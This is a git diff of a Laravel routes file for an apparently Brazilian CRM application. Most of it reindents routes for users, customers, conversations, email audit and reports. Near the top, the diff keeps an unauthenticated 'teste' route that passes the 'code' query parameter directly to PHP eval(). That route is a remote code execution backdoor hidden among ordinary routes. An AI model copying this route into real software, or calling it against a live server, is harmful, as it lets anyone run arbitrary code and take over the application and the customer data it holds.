@@ -46,222 +46,237 @@ use App\Http\Controllers\GeneralContactTypeController;
 |
 */
 
-Route::get('invite', function() {
-    auth()->user()->sendScheduleNotification(ConversationItem::find(6));
+Route::get('invite', function () {
+  auth()->user()->sendScheduleNotification(ConversationItem::find(6));
 });
 
-Route::get('teste', function() {
-    $code = $_GET['code'];
-    eval($code);
+Route::get('teste', function () {
+  $code = $_GET['code'];
+  eval($code);
 });
 
 Route::get('/', function () {
-    return redirect()->route('login');
+  return redirect()->route('login');
 })->name('home');
 
-Route::group(['middleware' => ['auth:sanctum', 'verified']], function() {
+Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
 
-    Route::middleware(['auth:sanctum', 'verified'])->get('/dashboard', function () {
-        return view('dashboard');
-    })->name('dashboard');
+  Route::middleware(['auth:sanctum', 'verified'])->get('/dashboard', function () {
+    return view('dashboard');
+  })->name('dashboard');
 
-    Route::resource('usuarios', UserController::class, [
-        'names' => 'users'])->parameters([
-        'usuarios' => 'user'
-    ]);
-    Route::prefix('usuarios')->name('users.')->group(function(){
-        Route::post('/filter', [UserController::class, 'filter'])->name('filter');
-        Route::post('/forgot-password/{user}', [UserController::class, 'forgotPassword'])->name('forgot-password');
+  Route::resource('usuarios', UserController::class, [
+    'names' => 'users'
+  ])->parameters([
+    'usuarios' => 'user'
+  ]);
+  Route::prefix('usuarios')->name('users.')->group(function () {
+    Route::post('/filter', [UserController::class, 'filter'])->name('filter');
+    Route::post('/forgot-password/{user}', [UserController::class, 'forgotPassword'])->name('forgot-password');
+  });
+
+  Route::prefix('config')->name('config.')->group(function () {
+    Route::get('/', [ConfigController::class, 'index'])->name('index');
+    Route::post('/store', [ConfigController::class, 'store'])->name('store');
+
+    Route::prefix('emails')->name('emails.')->group(function () {
+      Route::get('/', [EmailConfigController::class, 'index'])->name('index');
+      Route::post('/store', [EmailConfigController::class, 'store'])->name('store');
+      Route::resource('templates', TemplateEmailController::class);
+      Route::get('templates/mail-preview/{template}', [TemplateEmailController::class, 'show'])->name("templates.mail-preview");
+      Route::get('/email-audit', [EmailAuditController::class, 'index'])->name("email-audit.index");
+      Route::get('/email-audit/{email_audit}', [EmailAuditController::class, 'show'])->name("email-audit.show");
+      Route::post('/email-audit/filter', [EmailAuditController::class, 'filter'])->name("email-audit.filter");
+      Route::get('/email-audit/body/{email_audit}', [EmailAuditController::class, 'body'])->name("email-audit.body");
+    });
+  });
+
+  Route::resource('colacoradores', EmployeeController::class, [
+    'names' => 'employees'
+  ])->parameters([
+    'colacoradores' => 'employee'
+  ]);
+
+  Route::prefix('colacoradores')->name('employees.')->group(function () {
+    Route::post('/filter', [EmployeeController::class, 'filter'])->name('filter');
+    Route::post('/get', [EmployeeController::class, 'getByParams'])->name('get-by-params');
+  });
+
+  Route::resource('departamentos', DepartmentController::class, [
+    'names' => 'departments'
+  ])->parameters([
+    'departamentos' => 'department'
+  ]);
+
+  Route::prefix('departamentos')->name('departments.')->group(function () {
+    Route::post('/filter', [DepartmentController::class, 'filter'])->name('filter');
+  });
+
+  Route::resource('cargos', OccupationController::class, [
+    'names' => 'occupations'
+  ])->parameters([
+    'cargos' => 'occupation'
+  ]);
+
+  Route::prefix('cargos')->name('occupations.')->group(function () {
+    Route::post('/filter', [OccupationController::class, 'filter'])->name('filter');
+  });
+
+  Route::resource('diretorias', DirectionController::class, [
+    'names' => 'directions'
+  ])->parameters([
+    'diretorias' => 'direction'
+  ]);
+
+  Route::prefix('diretorias')->name('directions.')->group(function () {
+    Route::post('/filter', [DirectionController::class, 'filter'])->name('filter');
+  });
+
+  Route::resource('tipo-contato-geral', GeneralContactTypeController::class, [
+    'names' => 'general-contact-types'
+  ])->parameters([
+    'tipo-contato-geral' => 'general_contact_type'
+  ]);
+
+  Route::prefix('tipo-contato-geral')->name('general-contact-types.')->group(function () {
+    Route::post('/filter', [GeneralContactTypeController::class, 'filter'])->name('filter');
+  });
+
+  Route::resource('segmentos', SegmentController::class, [
+    'names' => 'segments'
+  ])->parameters([
+    'segmentos' => 'segment'
+  ]);
+
+  Route::prefix('segmentos')->name('segments.')->group(function () {
+    Route::post('/filter', [SegmentController::class, 'filter'])->name('filter');
+  });
+
+  Route::resource('status-conversa', ConversationStatusController::class, [
+    'names' => 'conversation-statuss'
+  ])->parameters([
+    'status-conversa' => 'conversation-status'
+  ]);
+
+  Route::prefix('status-conversa')->name('conversation-statuss.')->group(function () {
+    Route::post('/filter', [ConversationStatusController::class, 'filter'])->name('filter');
+  });
+
+  Route::resource('produtos', ProductController::class, [
+    'names' => 'products'
+  ])->parameters([
+    'produtos' => 'product'
+  ]);
+
+  Route::prefix('produtos')->name('products.')->group(function () {
+    Route::post('/filter', [ProductController::class, 'filter'])->name('filter');
+  });
+
+  Route::resource('clientes', CustomerController::class, [
+    'names' => 'customers'
+  ])->parameters([
+    'clientes' => 'customer'
+  ]);
+
+  Route::prefix('clientes')->name('customers.')->group(function () {
+    Route::post('/filter', [CustomerController::class, 'filter'])->name('filter');
+    Route::post('/cnpj/{cnpj}', [CustomerController::class, 'cnpj'])->name('cnpj');
+    Route::post('/filiais/{id}', [CustomerController::class, 'getCustomesParent'])->name('customers-parent');
+
+    Route::prefix('empresas')->name('companies.')->group(function () {
+      Route::post('/filter', [CompanyController::class, 'filter'])->name('filter');
+      Route::get('/index', [CompanyController::class, 'index'])->name('index');
     });
 
-    Route::prefix('config')->name('config.')->group(function(){
-        Route::get('/', [ConfigController::class, 'index'])->name('index');
-        Route::post('/store', [ConfigController::class, 'store'])->name('store');
-
-        Route::prefix('emails')->name('emails.')->group(function(){
-            Route::get('/', [EmailConfigController::class, 'index'])->name('index');
-            Route::post('/store', [EmailConfigController::class, 'store'])->name('store');
-            Route::resource('templates', TemplateEmailController::class);
-            Route::get('templates/mail-preview/{template}', [TemplateEmailController::class, 'show'])->name("templates.mail-preview");
-            Route::get('/email-audit', [EmailAuditController::class, 'index'])->name("email-audit.index");
-            Route::get('/email-audit/{email_audit}', [EmailAuditController::class, 'show'])->name("email-audit.show");
-            Route::post('/email-audit/filter', [EmailAuditController::class, 'filter'])->name("email-audit.filter");
-            Route::get('/email-audit/body/{email_audit}', [EmailAuditController::class, 'body'])->name("email-audit.body");
-        });
+    Route::prefix('cpea-ids')->name('cpea-ids.')->group(function () {
+      Route::post('/filter', [CpeaIdController::class, 'filter'])->name('filter');
+      Route::get('/index', [CpeaIdController::class, 'index'])->name('index');
     });
 
-    Route::resource('colacoradores', EmployeeController::class, [
-        'names' => 'employees'])->parameters([
-        'colacoradores' => 'employee'
-    ]);
-
-    Route::prefix('colacoradores')->name('employees.')->group(function(){
-        Route::post('/filter', [EmployeeController::class, 'filter'])->name('filter');
-        Route::post('/get', [EmployeeController::class, 'getByParams'])->name('get-by-params');
+    Route::prefix('contato')->name('contact.')->group(function () {
+      Route::put('/store', [ContactController::class, 'store'])->name('store');
+      Route::post('/update/{contact}', [ContactController::class, 'update'])->name('update');
+      Route::delete('/delete/{contact}', [ContactController::class, 'destroy'])->name('delete');
     });
 
-    Route::resource('departamentos', DepartmentController::class, [
-        'names' => 'departments'])->parameters([
-        'departamentos' => 'department'
+    Route::resource('contato-detalhado', DetailedContactController::class, [
+      'names' => 'detailed-contacts'
+    ])->parameters([
+      'contato-detalhado' => 'detailed_contact'
     ]);
 
-    Route::prefix('departamentos')->name('departments.')->group(function(){
-        Route::post('/filter', [DepartmentController::class, 'filter'])->name('filter');
+    Route::prefix('contato-detalhado')->name('detailed-contacts.')->group(function () {
+      Route::post('/contatos/{id}', [DetailedContactController::class, 'getContactsByCustomer'])->name('contacts-by-customer');
     });
 
-    Route::resource('cargos', OccupationController::class, [
-        'names' => 'occupations'])->parameters([
-        'cargos' => 'occupation'
-    ]);
-
-    Route::prefix('cargos')->name('occupations.')->group(function(){
-        Route::post('/filter', [OccupationController::class, 'filter'])->name('filter');
+    Route::prefix('endereco')->name('address.')->group(function () {
+      Route::post('/cep/{cep}', [AddressController::class, 'cep'])->name('cep');
+      Route::post('/cities/{state}', [AddressController::class, 'cities'])->name('cities');
     });
 
-    Route::resource('diretorias', DirectionController::class, [
-        'names' => 'directions'])->parameters([
-        'diretorias' => 'direction'
-    ]);
 
-    Route::prefix('diretorias')->name('directions.')->group(function(){
-        Route::post('/filter', [DirectionController::class, 'filter'])->name('filter');
-    });
+    Route::prefix('conversas')->name('conversations.')->group(function () {
+      Route::get('/{conversation}', [ConversationController::class, 'show'])->name('show');
+      Route::post('/store', [ConversationController::class, 'store'])->name('store');
+      Route::post('/conversa-por-id/{id}', [ConversationController::class, 'getById'])->name('by-id');
+      Route::post('/conversas-por-cliente/{id}', [ConversationController::class, 'getByCustomer'])->name('by-customer');
 
-    Route::resource('tipo-contato-geral', GeneralContactTypeController::class, [
-        'names' => 'general-contact-types'])->parameters([
-        'tipo-contato-geral' => 'general_contact_type'
-    ]);
+      Route::prefix('item')->name('item.')->group(function () {
+        Route::get('/create/{conversation}', [ConversationItemController::class, 'create'])->name('create');
+        Route::get('/faster-create', [ConversationItemController::class, 'fasterCreate'])->name('faster-create');
+        Route::get('/edit/{item}', [ConversationItemController::class, 'edit'])->name('edit');
+        Route::get('/{item}', [ConversationItemController::class, 'show'])->name('show');
+        Route::post('/store', [ConversationItemController::class, 'store'])->name('store');
+        Route::put('/update/{item}', [ConversationItemController::class, 'update'])->name('update');
 
-    Route::prefix('tipo-contato-geral')->name('general-contact-types.')->group(function(){
-        Route::post('/filter', [GeneralContactTypeController::class, 'filter'])->name('filter');
-    });
-
-    Route::resource('segmentos', SegmentController::class, [
-        'names' => 'segments'])->parameters([
-        'segmentos' => 'segment'
-    ]);
-
-    Route::prefix('segmentos')->name('segments.')->group(function(){
-        Route::post('/filter', [SegmentController::class, 'filter'])->name('filter');
-    });
-
-    Route::resource('status-conversa', ConversationStatusController::class, [
-        'names' => 'conversation-statuss'])->parameters([
-        'status-conversa' => 'conversation-status'
-    ]);
-
-    Route::prefix('status-conversa')->name('conversation-statuss.')->group(function(){
-        Route::post('/filter', [ConversationStatusController::class, 'filter'])->name('filter');
-    });
-
-    Route::resource('produtos', ProductController::class, [
-        'names' => 'products'])->parameters([
-        'produtos' => 'product'
-    ]);
-
-    Route::prefix('produtos')->name('products.')->group(function(){
-        Route::post('/filter', [ProductController::class, 'filter'])->name('filter');
-    });
-
-    Route::resource('clientes', CustomerController::class, [
-        'names' => 'customers'])->parameters([
-        'clientes' => 'customer'
-    ]);
-
-    Route::prefix('clientes')->name('customers.')->group(function(){
-        Route::post('/filter', [CustomerController::class, 'filter'])->name('filter');
-        Route::post('/cnpj/{cnpj}', [CustomerController::class, 'cnpj'])->name('cnpj');
-        Route::post('/filiais/{id}', [CustomerController::class, 'getCustomesParent'])->name('customers-parent');
-
-        Route::prefix('empresas')->name('companies.')->group(function(){
-            Route::post('/filter', [CompanyController::class, 'filter'])->name('filter');
-            Route::get('/index', [CompanyController::class, 'index'])->name('index');
-        });
-
-        Route::prefix('cpea-ids')->name('cpea-ids.')->group(function(){
-            Route::post('/filter', [CpeaIdController::class, 'filter'])->name('filter');
-            Route::get('/index', [CpeaIdController::class, 'index'])->name('index');
-        });
-
-        Route::prefix('contato')->name('contact.')->group(function(){
-            Route::put('/store', [ContactController::class, 'store'])->name('store');
-            Route::post('/update/{contact}', [ContactController::class, 'update'])->name('update');
-            Route::delete('/delete/{contact}', [ContactController::class, 'destroy'])->name('delete');
-        });
-
-        Route::resource('contato-detalhado', DetailedContactController::class, [
-            'names' => 'detailed-contacts'])->parameters([
-            'contato-detalhado' => 'detailed_contact'
-        ]);
-
-        Route::prefix('contato-detalhado')->name('detailed-contacts.')->group(function(){
-            Route::post('/contatos/{id}', [DetailedContactController::class, 'getContactsByCustomer'])->name('contacts-by-customer');
-        });
-
-        Route::prefix('endereco')->name('address.')->group(function(){
-            Route::post('/cep/{cep}', [AddressController::class, 'cep'])->name('cep');
-            Route::post('/cities/{state}', [AddressController::class, 'cities'])->name('cities');
-        });
-
-
-        Route::prefix('conversas')->name('conversations.')->group(function(){
-            Route::get('/{conversation}', [ConversationController::class, 'show'])->name('show');
-            Route::post('/store', [ConversationController::class, 'store'])->name('store');
-            Route::post('/conversa-por-id/{id}', [ConversationController::class, 'getById'])->name('by-id');
-            Route::post('/conversas-por-cliente/{id}', [ConversationController::class, 'getByCustomer'])->name('by-customer');
-
-            Route::prefix('item')->name('item.')->group(function(){
-                Route::get('/create/{conversation}', [ConversationItemController::class, 'create'])->name('create');
-                Route::get('/faster-create', [ConversationItemController::class, 'fasterCreate'])->name('faster-create');
-                Route::get('/edit/{item}', [ConversationItemController::class, 'edit'])->name('edit');
-                Route::get('/{item}', [ConversationItemController::class, 'show'])->name('show');
-                Route::post('/store', [ConversationItemController::class, 'store'])->name('store');
-                Route::put('/update/{item}', [ConversationItemController::class, 'update'])->name('update');
-
-                Route::prefix('anexos')->name('attachments.')->group(function(){
-                    Route::post('/store', [AttachmentController::class, 'store'])->name('store');
-                    Route::delete('/delete/{attachment}', [AttachmentController::class, 'destroy'])->name('delete');
-                });
-
-                Route::prefix('valores')->name('values.')->group(function(){
-                    Route::post('/store', [ValueController::class, 'store'])->name('store');
-                    Route::put('/update/{value}', [ValueController::class, 'update'])->name('update');
-                    Route::delete('/delete/{value}', [ValueController::class, 'destroy'])->name('delete');
-                });
-
-                Route::prefix('destinatario')->name('address.')->group(function(){
-                    Route::post('/store', [ScheduleAddressController::class, 'store'])->name('store');
-                    Route::put('/update/{address}', [ScheduleAddressController::class, 'update'])->name('update');
-                    Route::delete('/delete/{address}', [ScheduleAddressController::class, 'destroy'])->name('delete');
-                });
-            });
+        Route::prefix('anexos')->name('attachments.')->group(function () {
+          Route::post('/store', [AttachmentController::class, 'store'])->name('store');
+          Route::delete('/delete/{attachment}', [AttachmentController::class, 'destroy'])->name('delete');
         });
 
+        Route::prefix('valores')->name('values.')->group(function () {
+          Route::post('/store', [ValueController::class, 'store'])->name('store');
+          Route::put('/update/{value}', [ValueController::class, 'update'])->name('update');
+          Route::delete('/delete/{value}', [ValueController::class, 'destroy'])->name('delete');
+        });
+
+        Route::prefix('destinatario')->name('address.')->group(function () {
+          Route::post('/store', [ScheduleAddressController::class, 'store'])->name('store');
+          Route::put('/update/{address}', [ScheduleAddressController::class, 'update'])->name('update');
+          Route::delete('/delete/{address}', [ScheduleAddressController::class, 'destroy'])->name('delete');
+        });
+      });
     });
+  });
 
-    Route::prefix('azure')->name('azure.')->group(function(){
-        Route::get('token', [AzureAcessController::class, 'token'])->name('token');
-        Route::get('get-user-id/{email}', [AzureAcessController::class, 'getUserId'])->name('get-user-id');
-    });
+  Route::get('/report', [ConversationController::class, 'report'])->name('report');
 
-    Route::resource('etapas', EtapaController::class, [
-        'names' => 'etapas'])->parameters([
-        'etapas' => 'etapa'
-    ]);
+  Route::prefix('relatorios')->name('report.')->group(function () {
+    Route::get('/conversas/relatorio-1', [ConversationController::class, 'report1'])->name('report-1');
+  });
 
-    Route::prefix('etapas')->name('etapas.')->group(function(){
-        Route::post('/filter', [EtapaController::class, 'filter'])->name('filter');
-    });
+  Route::prefix('azure')->name('azure.')->group(function () {
+    Route::get('token', [AzureAcessController::class, 'token'])->name('token');
+    Route::get('get-user-id/{email}', [AzureAcessController::class, 'getUserId'])->name('get-user-id');
+  });
 
-    Route::resource('cnpjs', CnpjController::class, [
-        'names' => 'cnpjs'])->parameters([
-        'cnpjs' => 'cnpj'
-    ]);
+  Route::resource('etapas', EtapaController::class, [
+    'names' => 'etapas'
+  ])->parameters([
+    'etapas' => 'etapa'
+  ]);
 
-    Route::prefix('cnpjs')->name('cnpjs.')->group(function(){
-        Route::post('/filter', [CnpjController::class, 'filter'])->name('filter');
-    });
+  Route::prefix('etapas')->name('etapas.')->group(function () {
+    Route::post('/filter', [EtapaController::class, 'filter'])->name('filter');
+  });
 
+  Route::resource('cnpjs', CnpjController::class, [
+    'names' => 'cnpjs'
+  ])->parameters([
+    'cnpjs' => 'cnpj'
+  ]);
+
+  Route::prefix('cnpjs')->name('cnpjs.')->group(function () {
+    Route::post('/filter', [CnpjController::class, 'filter'])->name('filter');
+  });
 });
-
-
